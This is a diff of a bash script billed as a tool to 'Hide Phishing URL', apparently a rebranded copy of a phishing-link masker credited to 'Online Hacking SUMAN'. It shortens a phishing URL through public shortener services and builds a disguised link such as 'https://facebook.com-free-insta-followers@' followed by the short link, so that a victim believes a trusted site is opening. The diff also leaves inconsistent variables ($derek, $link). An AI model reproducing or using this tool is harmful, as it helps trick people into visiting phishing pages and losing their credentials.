@@ -1,4 +1,4 @@
-# Bash Script for Hide Phishing URL Created by KP
+# Bash Script for Hide Phishing URL Created by Online Hacking SUMAN
 
 url_checker() {
     if [ ! "${1//:*}" = http ]; then
@@ -35,8 +35,8 @@ echo -n " Paste Phishing URL here (with http or https): "
 read phish
 url_checker $phish
 #short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${phish})
-	#short=$(curl -s https://vurl.com/api.php?url=${phish})
-	derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
+	short=$(curl -s https://vurl.com/api.php?url=${phish})
+	#derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
         #checking for is.gd is working or not.
         if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
         shorter=${derek#https://}
@@ -50,10 +50,10 @@ url_checker $phish
         short=$(grep -o 'https://9qr.de/[-0-9a-zA-Z]*' "uri.log")
         shorter=${short#https://}
         fi
-        read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
+        read -p $'\n\033[1;92mOnlineHacking \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask
-	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"
-	printf "${green}shark ${white}>> ${white}Don't use space in your words\n"
-        read -p $'\e[1;92mshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
+	printf "${green}OnlineHacking ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"
+	printf "${green}OnlineHacking ${white}>> ${white}Don't use space in your words\n"
+        read -p $'\e[1;92mOnlineHacking \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
         final_url=$mask-$words@$shorter
-	printf "$final_url\n"
+	echo -e "Here is the Masking OH URL:\e[32m ${final_url} \e[0m\n"
